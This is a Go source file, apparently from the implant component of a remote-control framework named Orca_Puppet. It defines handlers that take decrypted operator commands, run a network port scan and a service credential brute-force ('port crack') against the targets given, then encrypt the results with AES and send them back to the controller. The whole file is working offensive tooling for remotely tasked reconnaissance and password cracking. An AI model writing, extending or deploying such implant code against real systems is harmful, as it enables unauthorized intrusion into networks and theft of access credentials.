package controller

import (
	"Orca_Puppet/cli/cmdopt/portopt/portcrackopt"
	"Orca_Puppet/cli/cmdopt/portopt/portscanopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"encoding/json"
	"fmt"
	"github.com/4dogs-cn/TXPortMap/pkg/output"
)

func portScanCmd(sendUserId, decData string) {
	portscanopt.ResultEvents = make([]*output.ResultEvent, 0)
	var scanCmdMsg portscanopt.ScanCmdMsg
	json.Unmarshal([]byte(decData), &scanCmdMsg)
	portscanopt.CheckSliceValue(&scanCmdMsg.CmdIps)
	portscanopt.CheckSliceValue(&scanCmdMsg.CmdPorts)
	portscanopt.CheckSliceValue(&scanCmdMsg.ExcIps)
	portscanopt.CheckSliceValue(&scanCmdMsg.ExcPorts)
	portscanopt.Init(scanCmdMsg.CmdIps, scanCmdMsg.CmdPorts, scanCmdMsg.CmdT1000, scanCmdMsg.CmdRandom, scanCmdMsg.NumThreads, scanCmdMsg.Limit, scanCmdMsg.ExcIps, scanCmdMsg.ExcPorts, "", false, true, "", "", scanCmdMsg.Tout, scanCmdMsg.Nbtscan)
	engine := portscanopt.CreateEngine()
	// 命令行参数错误
	if err := engine.Parser(); err != nil {
		outputMsg, _ := json.Marshal(err.Error())
		retData, _ := crypto.Encrypt(outputMsg, []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "portScan_ret", retData, "")
		return
	}
	engine.Run()
	// 等待扫描任务完成
	engine.Wg.Wait()
	outputMsg, _ := json.Marshal(portscanopt.ResultEvents)
	retData, _ := crypto.Encrypt(outputMsg, []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "portScan_ret", retData, "")
	if portscanopt.Writer != nil {
		portscanopt.Writer.Close()
	}
}

func portCrackCmd(sendUserId, decData string) {
	var options *portcrackopt.Options
	json.Unmarshal([]byte(decData), &options)
	newRunner, err := portcrackopt.NewRunner(options)
	if err != nil {
		msg := fmt.Sprintf("Could not create runner: %v", err)
		outputMsg := colorcode.OutputMessage(colorcode.SIGN_FAIL, msg)
		retData, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "portCrack_ret", retData, "")
		return
	}
	outputMsg := newRunner.Run()
	fmt.Println(outputMsg)
	retData, _ := crypto.Encrypt([]byte(outputMsg), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "portCrack_ret", retData, "")
}
